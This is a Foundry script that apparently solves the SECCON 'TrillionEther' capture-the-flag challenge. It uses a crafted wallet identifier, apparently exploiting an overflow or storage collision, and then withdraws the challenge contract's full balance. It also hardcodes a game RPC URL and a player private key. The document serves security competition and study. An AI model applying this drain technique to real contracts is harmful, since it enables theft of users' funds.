// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";

import {TrillionEther} from "../src/TrillionEther.sol";

contract solve is Script {
    uint256 playerPrivateKey;
    address player;

    TrillionEther problemInstance;

    function setUp() external {
        string memory rpcUrl = "http://trillion-ether.seccon.games:8545/fcf85a4f-6b2f-4f81-aef5-e966d043277f";
        playerPrivateKey = 0x6d9be7bb251e23e43ac737e9ce272c97d11eb2d8164b70fd92242a076eab0d30;
        address problemContract = 0x775e072738D978416d8bc7805B8Cf4f34C0Bf80F;
        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);
        problemInstance = TrillionEther(problemContract);
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);
        problemInstance.createWallet{value: 0}(bytes32(uint256(1)));
        // uint256 maxUint = type(uint256).max;
        // uint256 n = maxUint / 3;
        // console.log(n);
        problemInstance.createWallet{value: 0}(bytes32(uint256(38597363079105398474523661669562635951089994888546854679819194669304376546646)));
        problemInstance.withdraw(1, address(problemInstance).balance);
        vm.stopBroadcast();
    }
}